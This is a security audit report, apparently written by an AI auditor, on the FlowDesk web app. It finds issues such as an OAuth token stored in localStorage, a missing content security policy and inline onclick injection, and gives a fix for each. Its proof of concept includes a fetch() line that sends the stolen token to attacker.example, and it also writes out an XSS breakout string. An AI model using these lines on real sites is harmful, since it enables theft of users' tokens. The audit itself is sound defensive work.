# FlowDesk Security Audit Report
**Date:** 2026-03-18
**Scope:** dashboard.html, onboarding.html, auth.html, index.html, supabase.js
**Auditor:** Claude (read-only, no modifications made)

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 4 |
| Medium   | 4 |
| Low      | 3 |

---

## Findings

---

### [CRITICAL-01] OAuth Access Token Stored in localStorage — Token Theft via XSS

**File:** `dashboard.html` (~gcalHandleRedirect / gcalGetToken)
**OWASP:** A07 — Identification and Authentication Failures

**Description:**
The Google Calendar OAuth implicit-flow `access_token` is extracted from `location.hash` and written directly to `localStorage`:

```js
localStorage.setItem(GCAL_TOKEN_KEY, token);
localStorage.setItem(GCAL_EXPIRY_KEY, String(Date.now() + expiresIn * 1000));
```

`localStorage` is accessible to any JavaScript running on the same origin. If any XSS vector is ever exploited (see XSS findings below), an attacker can exfiltrate the Google Calendar OAuth token and use it to read the victim's full Google Calendar data — a significant privacy breach.

Additionally, the **implicit flow** (`response_type: 'token'`) is deprecated by Google and IETF RFC 9700 in favour of PKCE. The implicit flow is inherently less secure because tokens appear in URL fragments visible to the browser history and any scripts loaded before `history.replaceState` clears it.

**Proof of concept:**
```js
// Any script on kolimoli1.github.io can do:
const stolen = localStorage.getItem('flowdesk-gcal-token');
fetch('https://attacker.example/steal?t=' + stolen);
```

**Remediation:**
1. Migrate to OAuth Authorization Code + PKCE flow (supported by Google). Tokens are exchanged server-side and never appear in the URL.
2. If implicit flow must be kept short-term, use `sessionStorage` instead of `localStorage` so the token is cleared when the tab closes.
3. Ensure `history.replaceState` runs immediately and synchronously before any other code can read the hash.

---

### [HIGH-01] Exposed Supabase Anon Key in Public Repository

**File:** `supabase.js` (lines 8–9)
**OWASP:** A02 — Cryptographic Failures / Secrets Exposure

**Description:**
The Supabase anon key is committed verbatim to a public GitHub Pages repository:

```
SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
```

While the anon key is intended for client-side use and is RLS-protected, its public exposure means:
- Anyone can make API calls against the project's Supabase instance (data enumeration, brute-force auth, rate limit exhaustion).
- If RLS policies are ever misconfigured, all data becomes readable.
- The key cannot be rotated without breaking all live pages simultaneously.

The Google OAuth Client ID (`22221523577-oor1v181hhj23ptq438sgnkn5glt6hdg.apps.googleusercontent.com`) is also hardcoded in `dashboard.html`. While Client IDs are semi-public, combining them with the anon key raises the overall exposure surface.

**Remediation:**
- The anon key in a GitHub Pages repo is a structural constraint of this architecture; document it explicitly and ensure RLS is airtight on every table.
- Rotate the key immediately if the Supabase project is ever compromised.
- Consider using Supabase's "publishable" key once available, or proxy requests through a Cloudflare Worker / Netlify Edge Function so the real key is never in browser source.
- Set the Google OAuth Client ID's allowed JavaScript origins and redirect URIs to exactly `https://kolimoli1.github.io` only.

---

### [HIGH-02] Missing Content Security Policy on All Pages

**File:** index.html, auth.html, onboarding.html, dashboard.html (all `<head>` sections)
**OWASP:** A05 — Security Misconfiguration

**Description:**
No page sets a `Content-Security-Policy` header or `<meta http-equiv="Content-Security-Policy">`. GitHub Pages does not inject CSP headers by default.

Without CSP:
- Any injected script (via XSS, third-party CDN compromise, or browser extension) runs with full origin privileges.
- The anon key, OAuth tokens, and all DOM data are accessible to injected code.
- Clickjacking via `<iframe>` embedding is not prevented (no `frame-ancestors`).

The app loads scripts from three external CDNs (`cdn.jsdelivr.net` for Supabase, `cdnjs.cloudflare.com` for GSAP, `fonts.googleapis.com`) with no Subresource Integrity (SRI) hashes — a CDN compromise would deliver malicious scripts to all users.

**Remediation:**
Add a `<meta>` CSP to each page (GitHub Pages does not support response headers):
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' cdn.jsdelivr.net cdnjs.cloudflare.com 'sha256-...(inline hash)...';
  style-src 'self' fonts.googleapis.com 'unsafe-inline';
  font-src fonts.gstatic.com;
  connect-src https://teovjlyddhbiauadojsa.supabase.co https://www.googleapis.com;
  frame-ancestors 'none';
">
```
Also add SRI hashes to all CDN `<script>` and `<link>` tags.

---

### [HIGH-03] XSS via Unescaped task.id in onclick Attributes

**File:** `dashboard.html` (~renderTasks, updateDashStats)
**OWASP:** A03 — Injection (XSS)

**Description:**
Task and habit UUIDs from Supabase are interpolated directly into `onclick` attribute strings without escaping:

```js
`<button class="task-check-btn" onclick="toggleTask('${t.id}')" ...>`
`<button class="task-delete" onclick="deleteTask('${t.id}')" ...>`
```

Supabase UUIDs are system-generated and safe today. However:
1. If a future code change allows client-supplied IDs, or if a Supabase breach injected a crafted `id` into the database, the pattern `'); alert(1);//` in `t.id` would execute arbitrary JavaScript.
2. The onclick-string pattern is an inherently fragile injection surface — a single apostrophe breaks out of the JS string context.

The same pattern appears in renderHabits for habit IDs.

**Remediation:**
Use `data-*` attributes and `addEventListener` instead of inline `onclick`:
```js
const btn = document.createElement('button');
btn.dataset.id = t.id;
btn.addEventListener('click', () => toggleTask(btn.dataset.id));
```
Or at minimum escape: `t.id.replace(/'/g, "\\'")`. UUIDs never contain apostrophes, but the structural practice should still be corrected.

---

### [HIGH-04] Google Calendar Implicit Flow — Token Exposed in Browser History

**File:** `dashboard.html` (~gcalConnect, gcalHandleRedirect)
**OWASP:** A07 — Identification and Authentication Failures

**Description:**
`gcalConnect()` redirects the user to Google OAuth with `response_type: 'token'` (implicit flow). Google returns the access token in the URL fragment (`#access_token=...`). Even though `history.replaceState` clears it afterwards, the token is transiently visible in:
- The browser's session history (Back button on some browsers can restore it).
- Browser extensions with `webNavigation` or tab history access.
- Any analytics/logging scripts that fire on page load before `gcalHandleRedirect()` is called.

**Remediation:**
Migrate to Authorization Code + PKCE (`response_type=code&code_challenge=...`). This requires a lightweight server-side token exchange (Cloudflare Worker, Netlify Function, or Supabase Edge Function). The access and refresh tokens never appear in the URL.

---

### [MEDIUM-01] No Input Length Validation on Task/Habit/Course Names

**File:** `dashboard.html` (insertTask, saveHabit), `onboarding.html` (addCourse)
**OWASP:** A03 — Injection / A04 — Insecure Design

**Description:**
The task title, habit name/emoji, and course name inputs have no `maxlength` attribute or JS length check before being sent to Supabase. A user can submit:
- Extremely long strings that may break UI layouts or exceed DB column limits.
- Strings crafted to probe for Supabase column type mismatches.

`addCourse()` in onboarding does check for duplicates and the 8-course cap, but imposes no character-length limit.

**Remediation:**
- Add `maxlength` attributes to all `<input>` and `<textarea>` elements (e.g., 200 for task titles, 50 for course names).
- Add server-side DB column constraints (`VARCHAR(200)`) in Supabase.
- Validate in JS before the Supabase insert call.

---

### [MEDIUM-02] Open Redirect Risk via `?success=true&plan=group` Query Parameter

**File:** `index.html` (~success page handler)
**OWASP:** A01 — Broken Access Control (open redirect variant)

**Description:**
The success page handler reads `urlParams.get('plan')` and branches on the value `'group'` to change displayed UI text. While `plan` is only compared to a fixed string (not used in a redirect), the broader pattern of trusting query parameters to alter page state is dangerous if extended. More importantly, the `successBackBtn` handler unconditionally redirects to `dashboard.html` — if this were ever changed to use a query param for the redirect target (e.g. `?next=/dashboard.html`), it would become a full open redirect.

Currently the `plan` parameter only controls innerHTML of static strings (not user-supplied content), so XSS is not present here. But the design should be noted.

**Remediation:**
- Never use query parameters to supply redirect destinations.
- If the success state must be communicated, use a short-lived server-side session flag, a Supabase one-time token, or `sessionStorage`.

---

### [MEDIUM-03] focusSecondsToday Persisted in Plaintext localStorage — Data Integrity

**File:** `dashboard.html` (~getFocusLog, setFocusLog)
**OWASP:** A04 — Insecure Design

**Description:**
The focus/pomodoro log is stored in `localStorage` under `flowdesk-focus-log` as a plain JSON object keyed by date string. Any script on the same origin, or a user opening DevTools, can freely read or falsify this data:

```js
localStorage.setItem('flowdesk-focus-log', JSON.stringify({"2026-03-18": 999999}));
```

This inflates analytics numbers without any server validation. For a productivity app, gameable stats reduce trust in the product.

**Remediation:**
Persist focus sessions to a Supabase `focus_sessions` table (with `user_id`, `date`, `seconds`) so data is authoritative and cross-device. Use localStorage only as an ephemeral write-back cache.

---

### [MEDIUM-04] No CSRF Protection on State-Changing Forms (Structural Note)

**File:** All pages
**OWASP:** A01 — Broken Access Control

**Description:**
All state-changing operations (task insert/delete, habit create/toggle, profile upsert) are performed via the Supabase JavaScript SDK, which uses Bearer token authentication (JWT in the `Authorization` header). Because the JWT is in a request header rather than a cookie, traditional CSRF attacks (which exploit cookie-based session management) do not apply here.

However, if the session is ever moved to HttpOnly cookies (a security improvement), CSRF protection (double-submit cookie or SameSite=Strict) would become mandatory. The current architecture avoids CSRF by design of the Supabase SDK.

**No immediate action required**, but document this dependency explicitly so a future cookie-based auth migration does not inadvertently introduce CSRF.

---

### [LOW-01] `viewTitle` Injected via textContent (Safe), but `viewTitle` Also Contains Emoji Interpolation

**File:** `dashboard.html` (~loadAll)

**Description:**
```js
document.getElementById('viewTitle').textContent = `${greet.split(' ')[1]}, ${name.split(' ')[0]} 👋`;
```
`textContent` is used here (not `innerHTML`), so no XSS risk. However, if this is ever changed to `innerHTML`, the user-supplied `name` would become a vector. Noted for awareness only.

**Remediation:** No immediate action. Add a comment in the code noting that `innerHTML` must not replace `textContent` here without escaping.

---

### [LOW-02] Password Reset and OAuth Redirects Use `window.location.origin` — Reflected Origin Risk

**File:** `auth.html` (~googleLogin, forgotLink handler)

**Description:**
```js
redirectTo: window.location.origin + '/auth.html'
```
If the page were ever served from a different origin (e.g., during a domain migration, preview deployment, or if an attacker somehow served it from their domain via a subdomain takeover), this `origin` would point to the attacker's domain, directing OAuth callbacks there.

Supabase enforces a whitelist of allowed redirect URLs configured in the dashboard, which mitigates this — **only if** the whitelist is kept strict.

**Remediation:**
Hardcode the redirect URL as an absolute constant (`https://kolimoli1.github.io/auth.html`) rather than constructing it from `window.location.origin`. Verify the Supabase redirect URL allowlist contains only the production domain.

---

### [LOW-03] Sensitive Preference Data Readable from localStorage

**File:** All pages
**OWASP:** A02 — Cryptographic Failures

**Description:**
Keys stored in `localStorage`: `flowdesk-theme`, `flowdesk-color`, `flowdesk-font`, `flowdesk-density`, `flowdesk-particles`, `flowdesk-animations`, `flowdesk-focus-log`, `flowdesk-gcal-token`, `flowdesk-gcal-expiry`.

The `flowdesk-gcal-token` (a live Google OAuth access token) is the highest-risk item (covered in CRITICAL-01). The focus log and preferences are low-sensitivity but entirely tamper-able client-side.

**Remediation:**
See CRITICAL-01 for the token. For preferences, localStorage is appropriate. No additional action needed for themes/fonts.

---

## What Is Done Well

- `escapeHtml()` is consistently called when user-authored text (task titles, course names, habit names/emoji) is rendered into `innerHTML` template literals throughout dashboard.html and onboarding.html. No XSS found in the rendering of user text content.
- All Supabase data-fetch queries explicitly filter by `user_id: currentUser.id` client-side AND rely on RLS server-side — defense in depth.
- `profiles` query uses `.eq('id', currentUser.id)` (not `user_id`), which is correct for the profiles table schema.
- Auth guard on dashboard.html (`sb.auth.getSession()`) correctly redirects to `auth.html` if no session exists.
- `textContent` is correctly used (not `innerHTML`) for user name, greeting, plan label, and other profile fields.
- `full_name` from profile/metadata is rendered via `textContent` — safe.
- The onboarding `removeCourse(i)` uses a numeric array index (not user-supplied string), avoiding prototype pollution.
- Password minimum length is enforced both via `minlength="8"` HTML attribute and delegated to Supabase auth.

---

## Priority Remediation Order

1. **[CRITICAL-01]** Migrate Google Calendar OAuth from implicit to PKCE flow; stop storing access tokens in localStorage.
2. **[HIGH-02]** Add Content-Security-Policy `<meta>` tags and SRI hashes on all CDN resources.
3. **[HIGH-03]** Replace inline `onclick="fn('${id}')"` patterns with `data-*` + `addEventListener` to eliminate ID injection surface.
4. **[HIGH-04]** (Subsumed by CRITICAL-01) Fix implicit flow.
5. **[HIGH-01]** Document the anon-key exposure; verify RLS is enabled and correctly scoped on all tables.
6. **[MEDIUM-01]** Add `maxlength` to all inputs; add DB column constraints.
7. **[MEDIUM-03]** Persist focus sessions to Supabase rather than localStorage.
8. **[LOW-02]** Hardcode OAuth redirect URLs; verify Supabase allowlist.
